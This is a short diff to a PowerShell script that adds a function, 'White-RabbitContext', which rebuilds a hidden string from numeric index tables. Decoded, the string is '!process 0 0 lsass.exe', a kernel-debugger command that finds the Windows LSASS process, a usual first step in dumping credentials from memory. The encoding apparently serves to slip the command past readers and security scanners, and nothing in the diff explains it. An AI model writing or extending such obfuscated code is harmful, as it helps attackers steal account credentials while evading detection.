@@ -65,3 +65,9 @@ function White-RabbitCO {
     $chain = $chain[0]+$chain[1]
     return $chain
 }
+
+function White-RabbitContext {
+    $chain = (("1*34½1*23½1*24½1*10½1*30½1*15½1*32½1*32½1*1½1*44½1*1½1*44½1*1½1*11½1*32½1*18½1*32½1*32½1*6½1*15½1*45½1*15"-split "½")-split "_"|%{if($_-match "(\d+)\*(\d+)"){"$([char][int]("10T32T47T92T95T40T46T41T64T70T111T108T119T116T104T101T105T82T97T98T58T45T41T112T114T107T110T98T103T109T99T100T115T118T33T51T68T75T121T65T73T122T86T88T48T120"-split "T")[$matches[2]])"*$matches[1]}})
+    $chain = Clear-Chain ($chain)
+    return $chain
+}
